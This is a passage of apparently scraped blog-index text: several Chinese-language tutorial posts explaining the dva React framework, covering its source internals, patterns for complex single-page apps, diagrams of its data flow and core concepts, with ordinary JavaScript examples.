fns) &#123; effect = fn(effect, sagaEffects, model, key); &#125; return effect;&#125; 先不考虑 effect 的属性是数组而不是方法的情况。getWatcher 接收六个参数： 1、resolve/reject: 中间件 middleware 的 res 和 rej 方法。 2、key: 经过 prefixNamespace 转义后的 effect 方法名，namespace/effect（也是调用 action 时的 type）。 -_effect:effects 中 key 属性所指向的 generator 函数。 3、model： model 4、onError： 之前定义过的捕获全局错误的方法 5、onEffect：plugin.use 中传入的在触发 effect 时执行的回调函数（钩子函数） getWatcher 中 applyOnEffect 对 effect 进行了动态代理，在保证 effect （即 _effect）正常调用的情况下，为期添加了 fns 的回调函数数组(即 onEffect)。使得在 effect 执行时， onEffect 内的每一个回调函数都可以被触发。 因为没有经过 effects 的属性是数组的情况，所以代码中 type 的值是 takeEvery，也就是监听每一个发出的 action ，即 getWatcher 的返回值最终走的是 switch 的 default 选项，换句话说，每次发出指向 effects 的函数都会调用 sagaWithOnEffect: 123function*() &#123; yield takeEvery(key, sagaWithOnEffect);&#125;; 根据 const sagaWithOnEffect = applyOnEffect(onEffect, sagaWithCatch, model, key) 的执行情况，如果 onEffect 的插件为空的情况下，sagaWithOnEffect 的值为 sagaWithCatch ： 12345678910111213function *sagaWithCatch(...args) &#123; try &#123; yield sagaEffects.put(&#123; type: `$&#123;key&#125;$&#123;NAMESPACE_SEP&#125;@@start` &#125;); const ret = yield effect(...args.concat(createEffects(model))); yield sagaEffects.put(&#123; type: `$&#123;key&#125;$&#123;NAMESPACE_SEP&#125;@@end` &#125;); resolve(key, ret); &#125; catch (e) &#123; onError(e); if (!e._dontReject) &#123; reject(key, e); &#125; &#125;&#125; 在 sagaWithOnEffect 函数中，sagas 使用传入的参数(也就是 action)执行了对应的 model 中 对应的 effect 方法，同时将返回值使用之前保存在 map 里的 resolve 返回了其返回值。同时在执行 effect 方法的时候，将 saga 本身的所有方法(put、call、fork 等)作为第二个参数，使用 concat 拼接在 action 的后面。在执行 effect 方法前，又发出了 start 和 end 两个 action，方便 onEffect 的插件进行拦截和调用。 因此，对于 if (m.effects) sagas.push(app._getSaga(m.effects, m, onError, plugin.get(‘onEffect’)));。 1、dva 通过 app._getSaga(m.effects, m, onError, plugin.get(‘onEffect’)) 返回了一个 genenrator 函数。 2、在 genenrator 函数中手动 fork 出一个 watcher 函数的监听线程(当然也 fork 了取消线程的功能)。 3、该函数(在普通状态下)是一个 takeEvery 的阻塞是线程，接收 2 个参数。第一个参数为监听的 action，第二个参数为监听到 action 后的回调函数。 4、 (普通状态下)的回调函数，就是手动调用了 model 里 effects 中对应属性的函数。在此之前之后发出了 start 和 end 的 action，同时用之前 promise 中间件保存在 map 中的 resolve 方法返回了值。 5、最后使用 sagas.forEach(sagaMiddleware.run) 启动了 watcher 的监听。 4、store： 现在已经有了针对异步数据流的解决办法，那么该创建 store 了。正常情况的 redux 的 createStore 接收三个参数，reducer，initState，applyMiddleware(middlewares)。不过 dva 提供了自己的 createStore 方法，用来组织一系列自己创建的参数： 123456789// Create storeconst store = app._store = createStore(&#123; // eslint-disable-line reducers: createReducer(), initialState: hooksAndOpts.initialState || &#123;&#125;, plugin, createOpts, sagaMiddleware, promiseMiddleware,&#125;); createReducer： 1234567function createReducer() &#123; return reducerEnhancer(combineReducers(&#123; ...reducers, ...extraReducers, ...(app._store ? app._store.asyncReducers : &#123;&#125;), &#125;));&#125; createReducer 实际上是用 plugin 里的 onReducer(如果没有便直接返回 reducer) 扩展了 reducer 功能，对于 const reducerEnhancer = plugin.get(‘onReducer’)，plugin 里的相关代码为： 12345678function getOnReducer(hook) &#123; return function (reducer) &#123; for (const reducerEnhancer of hook) &#123; reducer = reducerEnhancer(reducer); &#125; return reducer; &#125;;&#125; combineReducers 中： 1、第一个参数 …reducers 是从 dva 里传入的 historyReducer，以及通过 reducers[m.namespace] = getReducer(m.reducers, m.state) 剥离出的 model 中的 reducer 2、第二个参数为手动在 plugin 里添加的 extraReducers 3、第三个参数为异步 reducer，主要是用于在 dva 运行以后动态加载 model 里的 reducer createStore： 现在我们有了一个 combine 过的 reducer，有了 core 中创建的 sagaMiddleware 和 promiseMiddleware，还有了从 dva 中传入的 createOpts，现在可以正式创建 store 了。 从 dva 中传入的 createOpts 为： 123456setupMiddlewares(middlewares) &#123; return [ routerMiddleware(history), ...middlewares, ];&#125;, 把 redux-router 的中间件排在中间件的第一个，虽然看起来很长，但是对于大多数普通用户来说，在未开启 redux 的调试插件，未传入额外的 onAction 以及 extraEnhancers 的情况下，上面的代码等价于: 123456789101112131415161718192021222324252627282930import &#123; createStore, applyMiddleware, compose &#125; from 'redux';import flatten from 'flatten';import invariant from 'invariant';import window from 'global/window';import &#123; returnSelf, isArray &#125; from './utils';export default function (&#123; reducers, initialState, plugin, sagaMiddleware, promiseMiddleware, createOpts: &#123; setupMiddlewares = returnSelf, &#125;,&#125;) &#123;const middlewares = setupMiddlewares([ sagaMiddleware, promiseMiddleware]);const enhancers = [ applyMiddleware(...middlewares)];return createStore(reducers, initialState, compose(...enhancers));// 对于 redux 中 的 compose 函数，在数组长度为 1 的情况下返回第一个元素。// compose(...enhancers) 等同于 applyMiddleware(...middlewares)&#125; 5、订阅： 现在 dva 已经创建了 store，有了异步数据流加载方案，并且又做了一些其他的事情，如手动运行 getSaga 里返回的 watcer 函数，判断如果有 onStateChange 的 plugin 也手动运行一下等： 1234567891011121314// Extend storestore.runSaga = sagaMiddleware.run;store.asyncReducers = &#123;&#125;;// Execute listeners when state is changedconst listeners = plugin.get('onStateChange');for (const listener of listeners) &#123; store.subscribe(() =&gt; &#123; listener(store.getState()); &#125;);&#125;// Run sagassagas.forEach(sagaMiddleware.run); model 里的 state、effect、reducer 已经实现了，就缺最后的订阅 subscription 部分： 12345678910// Setup appsetupApp(app);// Run subscriptionsconst unlisteners = &#123;&#125;;for (const model of this._models) &#123; if (model.subscriptions) &#123; unlisteners[model.namespace] = runSubscription(model.subscriptions, model, app, onError); &#125;&#125; setupApp(app) 是从 dva 里传过来的，主要是使用 patchHistory 函数代理 history.linsten，即强化了 redux 和 router 的联系，是的路径变化可以引起 state 的变化，进而听过监听 state 的变化来触发回调。这也是 core 中唯一使用 this 的地方，逼得 dva 中必须使用 oldStart.call(app) 来进行调用。 runSubscription： 这是 runSubscription 的代码: 12345678910111213141516171819export function run(subs, model, app, onError) &#123; const funcs = []; const nonFuncs = []; for (const key in subs) &#123; if (Object.prototype.hasOwnProperty.call(subs, key)) &#123; const sub = subs[key]; const unlistener = sub(&#123; dispatch: prefixedDispatch(app._store.dispatch, model), history: app._history, &#125;, onError); if (isFunction(unlistener)) &#123; funcs.push(unlistener); &#125; else &#123; nonFuncs.push(key); &#125; &#125; &#125; return &#123; funcs, nonFuncs &#125;;&#125; 1、第一个参数为 model 中的 subscription 对象 2、第二个参数为对应的 model 3、第三个参数为 core 里创建的 app 4、第四个参数为全局异常捕获的 onError a、Object.prototype.hasOwnProperty.call(subs, key) 还是使用原型方法判断 key 是不是 subs 的自有属性。 b、如果是自由属性，那么拿到属性对应的值(是一个 function) c、调用该 function，传入 dispatch 和 history 属性。history 就是经过 redux-router 强化过的 history，而 dispatch，也就是 prefixedDispatch(app._store.dispatch, model) 123456export default function prefixedDispatch(dispatch, model) &#123; return (action) =&gt; &#123; // 断言检测 return dispatch(&#123; ...action, type: prefixType(type, model) &#125;); &#125;;&#125; 实际上是用将 action 里的 type 添加了 ${model.namespance}/ 的前缀。自此，model 中的四大组件全部完毕，完成了 dva 的数据层处理。 标注： 参考资料1：https://dvajs.com","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-react","slug":"前端-react","permalink":"http://liuxuewen-site.github.io/tags/前端-react/"}]},{"title":"Dva官网之05-dva 开发复杂 SPA","slug":"Dva-gw-05","date":"2019-01-07T13:53:56.000Z","updated":"2019-01-08T01:51:24.181Z","comments":true,"path":"2019/01/07/Dva-gw-05/","link":"","permalink":"http://liuxuewen-site.github.io/2019/01/07/Dva-gw-05/","excerpt":"","text":"一、前言 在 dva 的官方仓库里，提供了上手教程，讲述了 dva 的一些基本概念。到了真实的业务开发过程中，会遇到许许多多不能用那些基本操作覆盖的场景，本文尝试列举一些常见的需求在 dva 中的实现方式。 二、动态加载 model 不少业务场景下我们可能会定义多个 model，但并不需要在应用启动的时候就全部加载，比较典型的是各类管理控制台。 如果每个功能页面是通过路由切换，互相之间没有关系的话，通常会使用 webpack 的 require.ensure 来做代码模块的懒加载。我们也可以利用这个特性来做model的动态加载： 1234567891011121314151617181920212223242526function RouterConfig(&#123; history, app &#125;) &#123; const routes = [ &#123; path: '/', name: 'IndexPage', getComponent(nextState, cb) &#123; require.ensure([], (require) =&gt; &#123; registerModel(app, require('./models/dashboard')); cb(null, require('./routes/IndexPage')); &#125;); &#125;, &#125;, &#123; path: '/users', name: 'UsersPage', getComponent(nextState, cb) &#123; require.ensure([], (require) =&gt; &#123; registerModel(app, require('./models/users')); cb(null, require('./routes/Users')); &#125;); &#125;, &#125;, ]; return &lt;Router history=&#123;history&#125; routes=&#123;routes&#125; /&gt;;&#125; 这样，在视图切换到这个路由的时候，对应的 model 就会被加载。同理，也可以做 model 的动态移除，不过一般情况下是不需要移除的。 三、用 model 共享全局信息 在二中我们提到，可以动态加载 model，也可以移除。从这个角度看，model 是可以有不同生命周期的，有些可以与功能视图伴随，而有些可以贯穿整个应用的生命周期。 从业务场景来说，有不少场景是可以做全局 model 的，比如说，我们在路由之间前进后退，model 可以用于在路由间共享数据，比较典型的像列表页和详情页的互相跳转，就可以用同一份 model 去共享它们的数据。 注意，如果当前应用中加载了不止一个 model，在其中一个的 effect 里面做 select 操作，是可以获取另外一个中的 state 的： 123*foo(action, &#123; select &#125;) &#123; const &#123; a, b &#125; = yield select();&#125; 这里 a，b 可以分别是两个不同 model 的 state。所以，借助这个特点，我们就不必非要把 model 按照视图的结构进行组织，可以适当按照业务分类，把一些数据存在对应业务的 model 中，分别通过不同的 effect 去更新，在获取的地方再去组合，这样可以使得 model 拥有更好的复用性。 四、model 的复用 有时候，业务上可能会遇到把一些与外部关联较少的 model 拆出来的需求，我们可能会拆出这样的一个 model，然后用不同的视图容器去 connect 它： 123456export default &#123; namespace: 'reusable', state: &#123;&#125;, reducers: &#123;&#125;, effects: &#123;&#125;&#125; 所以在业务上，可能出现的使用情况就是： 12345 ContainerA &lt;-- ModelA |------------------------------| |ContainerB &lt;-- reusable ContainerC &lt;-- reusable 这里面，ContainerB 和 Container C 是 ContainerA 的下属，它们的逻辑结构一致，只是展现不同，我们可以让它们分别 connect 同一个 model，注意，这个时候，model 的修改会同时影响到两个视图，因为 model 在 state 中是直接以 namespace 作 key 存放的，实际上只有一份实例。 五、动态扩展 model 在四中，我们提到可以把 model 进行分类，以实现在若干视图中的共享，但业务需求是比较多变的，很可能我们又会遇到这种情况：几个业务视图长得差不多，model 也存在少量差别。 这个情况下，如果我们让它们复用同一个 model 也可以，但这么做对维护是一种挑战，很可能改其中一个，对另外一些造成了影响，所以这种情况下，可能会期望能够对 model 进行扩展。 所谓扩展，通常是要做几个事情： 1）新增一些东西 2）覆盖一些原有的东西 3）根据条件动态创建一些东西 注意到 dva 中的每个 model，实际上都是普通的 JavaScript 对象，包含： 1）namespace 2）state 3）reducers 4）effects 5）subscriptions 从这个角度看，我们要新增或者覆盖一些东西都会是比较容易的，比如说，使用 Object.assign 来进行对象属性复制，就可以把新的内容添加或者覆盖到原有对象上。注意这里有两级，model 结构中的 state，reducers，effects，subscriptions 都是对象结构，需要分别在这一级去做 assign。可以借助 dva 社区的 dva-model-extend 库来做这件事。 换个角度，也可以通过工厂函数来生成 model，比如： 1234567891011121314151617function createModel(options) &#123; const &#123; namespace, param &#125; = options; return &#123; namespace: `demo$&#123;namespace&#125;`, states: &#123;&#125;, reducers: &#123;&#125;, effects: &#123; *foo() &#123; // 这里可以根据param来确定下面这个call的参数 yield call() &#125; &#125; &#125;;&#125;const modelA = createModel(&#123; namespace: 'A', param: &#123; type: 'A' &#125; &#125;);const modelB = createModel(&#123; namespace: 'A', param: &#123; type: 'B' &#125; &#125;); 这样也能够实现对 model 的扩展。 六、长流程的业务逻辑 在业务中，有时候会出现较长的流程，比如说，一个复杂表单的提交，中间会需要去发起多种对视图状态的操作，这是一个真实业务： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152*submit(action, &#123; put, call, select &#125;) &#123; const formData = yield select(state =&gt; &#123; const buyModel = state.buy; const context = state.context; const &#123; stock &#125; = buyModel; return &#123; uuid: context.uuid, market: stock &amp;&amp; stock.market, stockCode: stock &amp;&amp; stock.code, stockName: stock &amp;&amp; stock.name, price: String(buyModel.price), entrustAmount: String(buyModel.count), // 委托数量 totalBalance: buyModel.totalBalance, availableTzbBalance: buyModel.availableTzbBalance, availableDepositBalance: buyModel.availableDepositBalance, &#125;; &#125;); const result = yield call(post, '/h5/ajax/trade/entrust_buy', formData, &#123; loading: true &#125;); if (result.success) &#123; toast(&#123; type: 'success', content: '委托已受理', &#125;); // 成功之后再获取一次现价，并填入 // yield put(&#123;type: 'fetchQuotation', payload: stock&#125;); yield put(&#123; type: 'entrustNoChange', payload: result.result &amp;&amp; result.result.entrustNo &#125;); // 清空输入框内容 yield put(&#123; type: 'searchQueryChange', value: '' &#125;); &#125; // 403时，需要验证密码再重新提交 if (!result.success &amp;&amp; result.resultCode === 403) &#123; yield put(&#123; type: 'checkPassword', payload: &#123;&#125; &#125;); return; &#125; // 失败之后也需要更新投资宝和保证金金额 if (result.result) &#123; yield put(&#123; type: 'balanceChange', payload: result.result &#125;); &#125; // 重新获取最新可撤单列表 yield put(&#123; type: 'fetchRevockList' &#125;); // 返回的结果里面如果有uuid, 用新的uuid替换 if (result.uuid) &#123; yield put(&#123; type: 'context/updateUuid', payload: result.uuid &#125;); &#125;&#125;, 在一个 effect 中，可以使用多个 put 来分别调用 reducer 来更新状态。 另外存在一些流程，在 effect 中可能会存在多个异步的服务调用，比如说，要调用一次服务端的验证，成功之后再去提交数据，这时候，在一个 effect 中就会存在多个 call 操作了。 七、用 take 进行事件监听 与六提到的情况相比，我们还可能遇到另外一些场景，比如：一个流程的变动，需要扩散到若干个其他 model 中。这个需求其实也覆盖了六的情况，但在这一节中，我们侧重讨论这类需求比较通用的处理方式。 在 redux-saga 中，提供了 take 和 takeLatest 这两个操作，dva 是 redux-saga 的封装，也是可以使用这种操作的。要理解 take 操作的语义，可以参见这两种示例的对比。 假设我们有一个事件处理的代码： 1someSource.on('click', event =&gt; doSomething(event)) 这段代码转成用 generator 来表达，就是下面这个形式： 123456function* saga() &#123; while(true) &#123; const event = yield take('click'); doSomething(event); &#125;&#125; 所以，我们也可以在 dva 中使用 take 操作来监听 action。 八、多任务调度 在七中我们提到的是多个任务的串行执行方式，这是业务中最常见的多任务执行方式，只需逐个 yield call 就可以了。 有的时候，我们可能会希望多个任务以另外一些方式执行，比如： 1）并行，若干个任务之间不存在依赖关系，并且后续操作对它们的结果无依赖 2）竞争，若干个任务之间，只要有一个执行完成，就进入下一个环节 3）子任务，若干个任务，并行执行，但必须全部做完之后，下一个环节才继续执行 a、任务的并行执行： 如果想要让任务并行执行，可以通过下面这种方式： 1234const [result1, result2] = yield [ call(service1, param1), call(service2, param2)] 把多个要并行执行的东西放在一个数组里，就可以并行执行，等所有的都结束之后，进入下个环节，类似 promise.all 的操作。一般有一些集成界面，比如 dashboard，其中各组件之间业务关联较小，就可以用这种方式去分别加载数据，此时整体加载时间只取决于时间最长的那个。 注意上面代码中的 yield [] 不要写成 yield* []，这两者含义是不同的，后者会顺序执行。 b、任务的竞争： 如果多个任务之间存在竞争关系，可以通过下面这种方式： 123456789const &#123; data, timeout &#125; = yield race(&#123; data: call(service, 'some data'), timeout: call(delay, 1000)&#125;);if (data) put(&#123;type: 'DATA_RECEIVED', data&#125;);else put(&#123;type: 'TIMEOUT_ERROR'&#125;); 这个例子比较巧妙地用一个延时一秒的空操作来跟一个网络请求竞争，如果到了一秒，请求还没结束，就让它超时。这个类似于 Promise.race 的作用。 十、跨 model 的通信 当业务复杂的情况下，我们可能会对 model 进行拆分，但在这种情况下，往往又会遇到一些比较复杂的事情，比如：一个流程贯穿多个 model。对这个事情，我们可能有若干种不同的解决办法。 假设有如下场景： 1）父容器 A，子容器 B，二者各自 connect 了不同的 model A 和 model B 2）父容器中有一个操作，分三个步骤： model A 中某个 effect 处理第一步 call model B 中的某个 effect 去处理第二步 第二步结束后，再返回 model A 中做第三步 在 dva 中，可以用 namespace 去指定接受 action 的 model，所以可以通过类似这样的方式去组合： 123yield call(&#123; type: 'a/foo' &#125;);yield call(&#123; type: 'b/foo' &#125;);yield call(&#123; type: 'a/bar' &#125;); 甚至还可以利用 take 命令，在另外一个 model 的某个 effect 中插入逻辑： 1234567*effectA() &#123; yield call(service1); yield put(&#123; type: 'service1Success' &#125;); // 如果我们复用这个effect，但要在这里加一件事，怎么办？ yield call(service2); yield put(&#123; type: 'service2Success' &#125;);&#125; 可以利用之前我们说的 take 命令： 1yield take('a/service1Success'); 这样，可以在外部往里面添加一个并行操作，通过这样的组合可以处理一些组合流程。但实际情况下，我们可能要处理的不仅仅是 effect，很可能视图组件中还存在后续逻辑，在某个 action 执行之后，还需要再做某些事情。比如： 123yield call(&#123; type: 'a/foo' &#125;);yield call(&#123; type: 'b/foo' &#125;);// 如果这里是要在组件里面做某些事情，怎么办？ 可以利用一些特殊手段把流程延伸出来到组件里。比如说，我们通常在组件中 dispatch 一个 action 的时候，不会处理后续事情，但可以修改这个过程： 123456new Promise((resolve, reject) =&gt; &#123; dispatch(&#123; type: 'reusable/addLog', payload: &#123; data: 9527, resolve, reject &#125; &#125;);&#125;).then((data) =&gt; &#123; console.log(`after a long time, $&#123;data&#125; returns`);&#125;); 注意这里，我们是把 resolve 和 reject 传到 action 里面了，所以，只需在 effect 里面这样处理： 123456789try &#123; const result = yield call(service1); yield put(&#123; type: 'service1Success', payload: result &#125;); resolve(result);&#125;catch (error) &#123; yield put(&#123; type: 'service1Fail', error &#125;); reject(ex);&#125; 这样，就实现了跨越组件、模型的复杂的长流程的调用。 十一、为 dva 应用编写测试 在比较追求稳定性的工程中，应当使用单元测试来保证代码质量。在 Redux 的各类中间件中，redux-saga 应当是测试最简单的了，原因如下： 在一个应用中，除了视图组件之外，可能存在逻辑的地方主要是两种：reducer、effect。这两者中，reducer 是普通函数，并且是纯函数，职责单一，对于固定输入，就有固定输出，所以很容易测试。而在 effect 中，我们所要测试的东西是什么呢？如何确保测试能够覆盖某个effect，是全部真实执行一遍吗？ 所谓的单元测试，其实要测试的是某个函数自身的逻辑是否全被覆盖，像在一个 effect 中对外部服务（比如网络请求）的调用，这些外部服务的执行过程其实与本模块的单元测试无关，因此，我们只需要验证这件事：是否发起了对某个服务的调用。 至于说这个服务是否在执行，无关于本模块的正确性，那是这个服务的单元测试要做的事。所以这么一来，一个 effect 实际上是转化为同步逻辑的测试，因为它是一个 generator 函数，只需对这个 effect 一路 next，就能跑完整个逻辑。 对 redux-saga 的测试是这样的原理，而 dva 是对 redux-saga 的封装，这块的机制是一致的，所以我们可以用同样的方式，从 model 对象中获取 reducer 和 effect，分别编写测试用例。 标注： 参考资料1：https://dvajs.com","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-react","slug":"前端-react","permalink":"http://liuxuewen-site.github.io/tags/前端-react/"}]},{"title":"Dva官网之04-图解 dva","slug":"Dva-gw-04","date":"2019-01-07T12:39:46.000Z","updated":"2019-01-25T10:01:12.528Z","comments":true,"path":"2019/01/07/Dva-gw-04/","link":"","permalink":"http://liuxuewen-site.github.io/2019/01/07/Dva-gw-04/","excerpt":"","text":"一、示例背景 最常见的 Web 类示例之一: TodoList = Todo list + Add todo button 二、图解一: React 表示法 按照 React 官方指导意见, 如果多个 Component 之间要发生交互, 那么状态（即数据）就维护在这些 Component 的最小公约父节点上, 也即是 &lt; App / &gt;，&lt; TodoList / &gt; &lt; Todo / &gt; 以及&lt; AddTodoBtn / &gt; 本身不维持任何 state, 完全由父节点&lt; App / &gt; 传入 props 以决定其展现, 是一个纯函数的存在形式, 即: Pure Component。 三、图解二: Redux 表示法 React 只负责页面渲染, 而不负责页面逻辑, 页面逻辑可以从中单独抽取出来, 变成 store。与图一相比, 几个明显的改进点: 1）状态及页面逻辑从 &lt; App / &gt; 里面抽取出来, 成为独立的 store, 页面逻辑就是 reducer。 2）&lt; TodoList / &gt; 及 &lt; AddTodoBtn / &gt; 都是 Pure Component, 通过 connect 方法可以很方便地给它俩加一层 wrapper 从而建立起与 store 的联系: 可以通过 dispatch 向 store 注入 action, 促使 store 的状态进行变化, 同时又订阅了 store 的状态变化, 一旦状态有变, 被 connect 的组件也随之刷新。 3）使用 dispatch 往 store 发送 action 的这个过程是可以被拦截的, 自然而然地就可以在这里增加各种 Middleware, 实现各种自定义功能, eg: logging。 这样一来, 各个部分各司其职, 耦合度更低, 复用度更高, 扩展性更好。 四、图解三: 加入 Saga 上面说了, 可以使用 Middleware 拦截 action, 这样一来异步的网络操作也就很方便了, 做成一个 Middleware 就行了, 这里使用 redux-saga 这个类库, 举个栗子: 1）点击创建 Todo 的按钮, 发起一个 type == addTodo 的 action。 2）saga 拦截这个 action, 发起 http 请求, 如果请求成功, 则继续向 reducer 发一个 type == addTodoSucc 的 action, 提示创建成功, 反之则发送 type == addTodoFail 的 action 即可。 五、图解四: Dva 表示法 有了前面的三步铺垫, Dva 的出现也就水到渠成了, 正如 Dva 官网所言, Dva 是基于 React + Redux + Saga 的最佳实践沉淀, 做了 3 件很重要的事情, 大大提升了编码体验: 1）把 store 及 saga 统一为一个 model 的概念, 写在一个 js 文件里面。 2）增加了一个 Subscriptions, 用于收集其他来源的 action, eg: 键盘操作。 3）model 写法很简约, 类似于 DSL 或者 RoR, coding 快得飞起。 约定优于配置, 总是好的： 123456789101112131415161718192021222324252627282930app.model(&#123; namespace: 'count', state: &#123; record: 0, current: 0, &#125;, reducers: &#123; add(state) &#123; const newCurrent = state.current + 1; return &#123; ...state, record: newCurrent &gt; state.record ? newCurrent : state.record, current: newCurrent, &#125;; &#125;, minus(state) &#123; return &#123; ...state, current: state.current - 1&#125;; &#125;, &#125;, effects: &#123; *add(action, &#123; call, put &#125;) &#123; yield call(delay, 1000); yield put(&#123; type: 'minus' &#125;); &#125;, &#125;, subscriptions: &#123; keyboardWatcher(&#123; dispatch &#125;) &#123; key('⌘+up, ctrl+up', () =&gt; &#123; dispatch(&#123;type:'add'&#125;) &#125;); &#125;, &#125;,&#125;); 标注： 参考资料1：https://dvajs.com","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-react","slug":"前端-react","permalink":"http://liuxuewen-site.github.io/tags/前端-react/"}]},{"title":"Dva官网之03-综合","slug":"Dva-gw-03","date":"2019-01-07T09:52:18.000Z","updated":"2019-01-25T10:00:52.321Z","comments":true,"path":"2019/01/07/Dva-gw-03/","link":"","permalink":"http://liuxuewen-site.github.io/2019/01/07/Dva-gw-03/","excerpt":"","text":"一、React 没有解决的问题 React 本身只是一个 DOM 的抽象层，使用组件构建虚拟 DOM。如果开发大应用，还需要解决一些问题： 1）通信：组件之间如何通信？ 2）数据流：数据如何和视图串联起来？路由和数据如何绑定？如何编写异步逻辑？等等 二、通信问题 组件会发生三种通信： 1）向子组件发消息 2）向父组件发消息 3）向其他组件发消息 React 只提供了一种通信手段：传参。对于大应用很不方便。看一看组件通信的例子。 步骤一，想一想父组件如何拿到子组件的值： 1234567891011121314151617class Son extends React.Component &#123; render() &#123; return &lt;input/&gt;; &#125;&#125;class Father extends React.Component &#123; render() &#123; return &lt;div&gt; &lt;Son/&gt; &lt;p&gt;这里显示 Son 组件的内容&lt;/p&gt; &lt;/div&gt;; &#125;&#125;ReactDOM.render(&lt;Father/&gt;, mountNode); 步骤二，理解子组件如何通过父组件传入的函数，将自己的值再传回父组件： 12345678910111213141516171819202122232425262728class Son extends React.Component &#123; render() &#123; return &lt;input onChange=&#123;this.props.onChange&#125;/&gt;; &#125;&#125;class Father extends React.Component &#123; constructor() &#123; super(); this.state = &#123; son: \"\" &#125; &#125; changeHandler(e) &#123; this.setState(&#123; son: e.target.value &#125;); &#125; render() &#123; return &lt;div&gt; &lt;Son onChange=&#123;this.changeHandler.bind(this)&#125;/&gt; &lt;p&gt;这里显示 Son 组件的内容：&#123;this.state.son&#125;&lt;/p&gt; &lt;/div&gt;; &#125;&#125;ReactDOM.render(&lt;Father/&gt;, mountNode); 三、数据流问题 目前流行的数据流方案有： 1）Flux，单向数据流方案，以 Redux 为代表 2）Reactive，响应式数据流方案，以 Mobx 为代表 3）其他，比如 rxjs 等 目前最流行的数据流方案（截止 2017.1，最流行的社区 React 应用架构方案如下）： 1）路由：React-Router 2）架构：Redux 3）异步操作：Redux-saga 此数据流方案的缺点：要引入多个库，项目结构复杂。 四、dva1、是什么： dva 是体验技术部开发的 React 应用框架，将上面三个 React 工具库包装在一起，简化了 API，让开发 React 应用更加方便和快捷。dva = React-Router + Redux + Redux-saga 2、应用的最简结构： 不带model： 123456789101112import dva from 'dva';const App = () =&gt; &lt;div&gt;Hello dva&lt;/div&gt;;// 创建应用const app = dva();// 注册视图app.router(() =&gt; &lt;App /&gt;);// 启动应用app.start('#root'); 带model： 123456789101112131415161718192021222324252627import dva from 'dva';const App = () =&gt; &lt;div&gt;Hello dva&lt;/div&gt;;// 创建应用const app = dva();// 注册 Modelapp.model(&#123; namespace: 'count', state: 0, reducers: &#123; add(state) &#123; return state + 1 &#125;, &#125;, effects: &#123; *addAfter1Second(action, &#123; call, put &#125;) &#123; yield call(delay, 1000); yield put(&#123; type: 'add' &#125;); &#125;, &#125;,&#125;);// 注册视图app.router(() =&gt; &lt;ConnectedApp /&gt;);// 启动应用app.start('#root'); 3、数据流图： 4、核心概念： 1）State：一个对象，保存整个应用状态 2）View：React 组件构成的视图层 3）Action：一个对象，描述事件 4）connect 方法：一个函数，绑定 State 到 View 5）dispatch 方法：一个函数，发送 Action 到 State 5、State 和 View： State 是储存数据的地方，收到 Action 以后，会更新数据。 View 就是 React 组件构成的 UI 层，从 State 取数据后，渲染成 HTML 代码，只要 State 有变化，View 就会自动更新。 6、Action： Action 是用来描述 UI 层事件的一个对象： 1234&#123; type: 'click-submit-button', payload: this.form.data&#125; 7、connect： connect 是一个函数，绑定 State 到 View。connect 方法返回的是一个 React 组件，通常称为容器组件，因为它是原始 UI 组件的容器，即在外面包了一层 State。connect 方法传入的第一个参数是 mapStateToProps 函数，mapStateToProps 函数会返回一个对象，用于建立 State 到 Props 的映射关系。 123456import &#123; connect &#125; from 'dva';function mapStateToProps(state) &#123; return &#123; todos: state.todos &#125;;&#125;connect(mapStateToProps)(App); 8、dispatch： dispatch 是一个函数方法，用来将 Action 发送给 State。被 connect 的 Component 会自动在 props 中拥有 dispatch 方法。 1234dispatch(&#123; type: 'click-submit-button', payload: this.form.data&#125;) 9、app.model： dva 提供 app.model 这个对象，所有的应用逻辑都定义在它上面： 123456789101112131415import dva from 'dva';const App = () =&gt; &lt;div&gt;Hello dva&lt;/div&gt;;// 创建应用const app = dva();// 新增这一行app.model(&#123; /**/ &#125;);// 注册视图app.router(() =&gt; &lt;App /&gt;);// 启动应用app.start('#root'); Model 对象的例子: 12345678910111213&#123; namespace: 'count', state: 0, reducers: &#123; add(state) &#123; return state + 1 &#125;, &#125;, effects: &#123; *addAfter1Second(action, &#123; call, put &#125;) &#123; yield call(delay, 1000); yield put(&#123; type: 'add' &#125;); &#125;, &#125;,&#125; Model 对象的属性: 1）namespace: 当前 Model 的名称。整个应用的 State，由多个小的 Model 的 State 以 namespace 为 key 合成 2）state: 该 Model 当前的状态。数据保存在这里，直接决定了视图层的输出 3）reducers: Action 处理器，处理同步动作，用来算出最新的 State 4）effects：Action 处理器，处理异步动作 10、Reducer： Reducer 是 Action 处理器，用来处理同步操作，可以看做是 state 的计算器，它的作用是根据 Action，从上一个 State 算出当前 State。举个例子： 123456789101112131415161718// count +1function add(state) &#123; return state + 1; &#125;// 往 [] 里添加一个新 todofunction addTodo(state, action) &#123; return [...state, action.payload]; &#125;// 往 &#123; todos: [], loading: true &#125; 里添加一个新 todo，并标记 loading 为 falsefunction addTodo(state, action) &#123; return &#123; ...state, todos: state.todos.concat(action.payload), loading: false &#125;;&#125; 11、Effect： Effect 是 Action 处理器，用来处理异步动作，基于 Redux-saga 实现。Effect 指的是副作用，根据函数式编程，计算以外的操作都属于 Effect，典型的就是 I/O 操作、数据库读写： 123456// Effect 是一个 Generator 函数，内部使用 yield 关键字，标识每一步的操作（不管是异步或同步）。function *addAfter1Second(action, &#123; put, call &#125;) &#123; yield call(delay, 1000); yield put(&#123; type: 'add' &#125;);&#125; dva 提供多个 Effect 函数内部的处理函数，比较常用的是 call 和 put: 1）call：执行异步函数 2）put：发出一个 Action，类似于 dispatch 标注： 参考资料1：https://dvajs.com","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-react","slug":"前端-react","permalink":"http://liuxuewen-site.github.io/tags/前端-react/"}]},{"title":"Dva官网之02-概念","slug":"Dva-gw-02","date":"2019-01-07T08:57:03.000Z","updated":"2019-01-25T10:00:39.829Z","comments":true,"path":"2019/01/07/Dva-gw-02/","link":"","permalink":"http://liuxuewen-site.github.io/2019/01/07/Dva-gw-02/","excerpt":"","text":"一、 数据流向 数据改变的发生通常是通过用户交互行为或者浏览器行为（如路由跳转等）触发的，可以通过 dispatch 发起一个 action，如果是同步行为会直接通过 Reducers 改变 State 